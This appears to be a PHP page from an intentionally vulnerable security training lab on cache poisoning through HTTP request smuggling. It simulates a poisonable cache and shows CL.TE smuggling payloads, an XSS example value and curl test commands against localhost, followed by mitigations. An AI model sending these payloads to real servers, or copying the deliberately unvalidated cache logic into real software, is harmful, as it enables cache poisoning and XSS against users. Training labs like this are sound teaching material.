<?php
// Lab 4: Cache Poisoning via Smuggling
// Vulnerability: Using request smuggling to poison caches

session_start();

$message = '';
$request_data = '';
$response_data = '';
$cache_key = '';

// Simulate cache functionality
if (!isset($_SESSION['cache'])) {
    $_SESSION['cache'] = [];
}

// Simulate request processing
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $request_data = file_get_contents('php://input');
    $response_data = "Request processed successfully!\n";
    $response_data .= "Content-Length: " . strlen($request_data) . "\n";
    $response_data .= "Request Body: " . $request_data . "\n";
    
    // Check for cache poisoning attempts
    if (strpos($request_data, 'X-Cache-Key') !== false) {
        $response_data .= "\n⚠️  CACHE POISONING ATTEMPT DETECTED!\n";
        $response_data .= "This could lead to serving malicious content to users\n";
        $response_data .= "if the cache is poisoned via request smuggling.\n";
        
        // Extract cache key from request
        if (preg_match('/X-Cache-Key:\s*([^\r\n]+)/', $request_data, $matches)) {
            $cache_key = trim($matches[1]);
            $_SESSION['cache'][$cache_key] = "POISONED: " . $request_data;
            $response_data .= "Cache key '$cache_key' has been poisoned!\n";
        }
    }
    
    $message = '<div class="alert alert-success">Request processed! Check the response below.</div>';
}

// Handle cache retrieval
if (isset($_GET['cache_key'])) {
    $cache_key = $_GET['cache_key'];
    if (isset($_SESSION['cache'][$cache_key])) {
        $response_data = "Cache hit for key: $cache_key\n";
        $response_data .= "Cached content: " . $_SESSION['cache'][$cache_key] . "\n";
    } else {
        $response_data = "Cache miss for key: $cache_key\n";
    }
    $message = '<div class="alert alert-info">Cache retrieved! Check the response below.</div>';
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lab 4: Cache Poisoning via Smuggling - HTTP Request Smuggling</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.9.1/font/bootstrap-icons.css">
    
    <style>
        :root {
            --primary-dark: #1a1f36;
            --accent-green: #48bb78;
            --accent-blue: #4299e1;
            --accent-orange: #ed8936;
            --accent-red: #f56565;
        }
        
        body {
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            color: #e2e8f0;
            min-height: 100vh;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        .navbar-brand {
            font-weight: 700;
            font-size: 1.5rem;
            color: var(--accent-green) !important;
        }

        .nav-link {
            font-weight: 500;
            transition: color 0.3s;
        }

        .nav-link:hover {
            color: var(--accent-green) !important;
        }

        .hero-section {
            background: linear-gradient(rgba(15, 23, 42, 0.9), rgba(15, 23, 42, 0.9)), 
                        url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%231e293b"/><path d="M0 0L100 100M100 0L0 100" stroke="%23374151" stroke-width="1"/></svg>');
            padding: 2rem 0;
            border-bottom: 1px solid #2d3748;
            margin-bottom: 2rem;
        }

        .hero-title {
            font-size: 2rem;
            font-weight: 700;
            background: linear-gradient(90deg, #48bb78, #4299e1);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 0.5rem;
        }

        .hero-subtitle {
            font-size: 1rem;
            color: #cbd5e0;
        }

        .section-title {
            margin-top: 30px;
            margin-bottom: 20px;
            font-weight: 700;
            font-size: 1.5rem;
            position: relative;
            padding-bottom: 10px;
        }

        .section-title::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 60px;
            height: 4px;
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border-radius: 2px;
        }

        .card {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            color: #e2e8f0;
        }

        .card-header {
            background: rgba(15, 23, 42, 0.5);
            border-bottom: 1px solid #334155;
            font-weight: 600;
            padding: 1rem 1.5rem;
        }

        .form-control, .form-select {
            background: rgba(30, 41, 59, 0.7);
            border: 1px solid #334155;
            color: #e2e8f0;
            padding: 0.75rem 1rem;
        }

        .form-control:focus, .form-select:focus {
            background: rgba(30, 41, 59, 0.9);
            border-color: var(--accent-green);
            box-shadow: 0 0 0 0.2rem rgba(72, 187, 120, 0.25);
            color: #e2e8f0;
        }

        .form-label {
            font-weight: 500;
            color: #cbd5e0;
        }

        .btn-primary {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border: none;
            padding: 0.75rem 1.5rem;
            font-weight: 600;
            transition: all 0.3s;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(72, 187, 120, 0.3);
        }

        .vulnerability-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-orange);
        }

        .payload-examples {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-blue);
        }

        .danger-zone {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-red);
        }

        pre {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            color: #e2e8f0;
            border: 1px solid #334155;
            overflow-x: auto;
        }

        .lab-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
        }

        .lab-badge {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            color: #1a202c;
            font-weight: 600;
            padding: 0.5rem 1rem;
            border-radius: 6px;
            display: inline-block;
            margin-bottom: 1rem;
        }

        .request-display {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border-left: 4px solid var(--accent-green);
        }

        .test-urls {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin-bottom: 1rem;
            border-left: 4px solid var(--accent-blue);
        }

        .request-info {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
        }

        .sensitive-data {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-red);
        }

        .code-block {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-blue);
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
        }
    </style>
</head>
<body>
    <nav class="navbar navbar-expand-md navbar-dark sticky-top" style="background-color: var(--primary-dark);">
        <div class="container-fluid">
            <a class="navbar-brand" href="index.php">
                <i class="bi bi-arrow-left me-2"></i>Back to HTTP Request Smuggling Labs
            </a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse"
                data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false"
                aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>

            <div class="collapse navbar-collapse" id="navbarSupportedContent">
                <ul class="navbar-nav me-auto mb-2 mb-lg-0">
                    <li class="nav-item">
                        <a class="nav-link active" href="../about">About</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link active" href="../contact">Contact Us</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>

    <div class="hero-section">
        <div class="container">
            <h1 class="hero-title">Lab 4: Cache Poisoning via Smuggling</h1>
            <p class="hero-subtitle">Using request smuggling to poison caches and serve malicious content</p>
        </div>
    </div>

    <div class="container mb-5">
        <div class="lab-info">
            <span class="lab-badge">Difficulty: High</span>
            <h3 class="section-title">Lab Overview</h3>
            <p>This lab demonstrates how HTTP Request Smuggling can be used to poison caches and serve malicious content to users. By smuggling requests that target cache keys, attackers can poison the cache and serve malicious content to legitimate users.</p>
            <p><strong>Objective:</strong> Use request smuggling to poison the cache and serve malicious content to users.</p>
        </div>

        <div class="row">
            <div class="col-lg-6">
                <div class="card mb-4">
                    <div class="card-header text-center">
                        <i class="bi bi-code-slash me-2"></i>Cache Poisoning Attack
                    </div>
                    <div class="card-body">
                        <pre>
// Cache Poisoning via Request Smuggling

// Step 1: Smuggle a request that poisons the cache
POST /4.php HTTP/1.1
Host: example.com
Content-Length: 13
Transfer-Encoding: chunked

0

GET /4.php?cache_key=homepage HTTP/1.1
Host: example.com
X-Cache-Key: homepage
Content-Length: 0

// Step 2: The smuggled request poisons the cache
// Step 3: Legitimate users get the poisoned content

// Example poisoned cache entry:
// Key: homepage
// Value: POISONED: <script>alert('XSS')</script></pre>
                    </div>
                </div>
            </div>
            
            <div class="col-lg-6">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-shield-exclamation me-2"></i>Cache Poisoning Tester
                    </div>
                    <div class="card-body">
                        <?php echo $message; ?>
                        
                        <form method="POST">
                            <div class="mb-3">
                                <label for="request_body" class="form-label">Request Body</label>
                                <textarea class="form-control" id="request_body" name="request_body" rows="4" 
                                          placeholder="Enter your request body here...">0

GET /4.php?cache_key=homepage HTTP/1.1
Host: example.com
X-Cache-Key: homepage
Content-Length: 0

</textarea>
                            </div>
                            <button type="submit" class="btn btn-primary">Send Request</button>
                        </form>
                        
                        <form method="GET" class="mt-3">
                            <div class="mb-3">
                                <label for="cache_key" class="form-label">Check Cache</label>
                                <input type="text" class="form-control" id="cache_key" name="cache_key" 
                                       placeholder="Enter cache key..." value="homepage">
                            </div>
                            <button type="submit" class="btn btn-primary">Check Cache</button>
                        </form>
                        
                        <div class="test-urls">
                            <h6><i class="bi bi-link me-2"></i>Test Payloads:</h6>
                            <ul>
                                <li><code>0\r\n\r\nGET /4.php?cache_key=homepage HTTP/1.1\r\nHost: example.com\r\nX-Cache-Key: homepage\r\nContent-Length: 0\r\n\r\n</code></li>
                                <li><code>0\r\n\r\nGET /4.php?cache_key=admin HTTP/1.1\r\nHost: example.com\r\nX-Cache-Key: admin\r\nContent-Length: 0\r\n\r\n</code></li>
                                <li><code>0\r\n\r\nGET /4.php?cache_key=api HTTP/1.1\r\nHost: example.com\r\nX-Cache-Key: api\r\nContent-Length: 0\r\n\r\n</code></li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <?php if ($response_data): ?>
        <div class="row mt-4">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-shield-exclamation me-2"></i>Response Analysis
                    </div>
                    <div class="card-body">
                        <div class="request-display">
                            <h5>Server Response</h5>
                            <div class="sensitive-data">
                                <pre><?php echo htmlspecialchars($response_data); ?></pre>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <?php endif; ?>

        <div class="row mt-4">
            <div class="col-md-6">
                <div class="vulnerability-info">
                    <h5><i class="bi bi-bug me-2"></i>Vulnerability Details</h5>
                    <ul>
                        <li><strong>Type:</strong> HTTP Request Smuggling (Cache Poisoning)</li>
                        <li><strong>Severity:</strong> Critical</li>
                        <li><strong>Method:</strong> POST/GET</li>
                        <li><strong>Issue:</strong> Cache poisoning via request smuggling</li>
                    </ul>
                </div>
            </div>
            
            <div class="col-md-6">
                <div class="payload-examples">
                    <h5><i class="bi bi-target me-2"></i>Test Payloads</h5>
                    <p>Try these payloads in the request body:</p>
                    <ul>
                        <li><code>0\r\n\r\nGET /4.php?cache_key=homepage HTTP/1.1\r\nHost: example.com\r\nX-Cache-Key: homepage\r\nContent-Length: 0\r\n\r\n</code></li>
                        <li><code>0\r\n\r\nGET /4.php?cache_key=admin HTTP/1.1\r\nHost: example.com\r\nX-Cache-Key: admin\r\nContent-Length: 0\r\n\r\n</code></li>
                        <li><code>0\r\n\r\nGET /4.php?cache_key=api HTTP/1.1\r\nHost: example.com\r\nX-Cache-Key: api\r\nContent-Length: 0\r\n\r\n</code></li>
                    </ul>
                </div>
            </div>
        </div>

        <div class="test-urls">
            <h5><i class="bi bi-link me-2"></i>Manual Testing with curl</h5>
            <p>Use these curl commands to test the vulnerability:</p>
            <div class="code-block"># Step 1: Poison the cache
curl -X POST http://localhost/test/http_rs/4.php \
  -H "Content-Length: 13" \
  -H "Transfer-Encoding: chunked" \
  -d "0

GET /4.php?cache_key=homepage HTTP/1.1
Host: example.com
X-Cache-Key: homepage
Content-Length: 0

"

# Step 2: Check if cache was poisoned
curl "http://localhost/test/http_rs/4.php?cache_key=homepage"</div>
        </div>

        <div class="danger-zone">
            <h5><i class="bi bi-exclamation-triangle me-2"></i>Real-World Attack Scenarios</h5>
            <ul>
                <li>Cache poisoning and serving malicious content to users</li>
                <li>XSS attacks via poisoned cache entries</li>
                <li>Phishing attacks by poisoning legitimate pages</li>
                <li>Session hijacking and user impersonation</li>
                <li>Bypass authentication and authorization mechanisms</li>
                <li>Compliance violations and security breaches</li>
            </ul>
        </div>

        <div class="card mt-4">
            <div class="card-header">
                <i class="bi bi-lightbulb me-2"></i>Mitigation Strategies
            </div>
            <div class="card-body">
                <ul>
                    <li>Ensure consistent parsing between frontend and backend servers</li>
                    <li>Implement proper cache validation and sanitization</li>
                    <li>Use cache keys that are not controllable by users</li>
                    <li>Implement request validation and sanitization</li>
                    <li>Use reverse proxies that handle parsing consistently</li>
                    <li>Regular security testing and vulnerability assessments</li>
                    <li>Monitor for unusual request patterns and cache anomalies</li>
                </ul>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
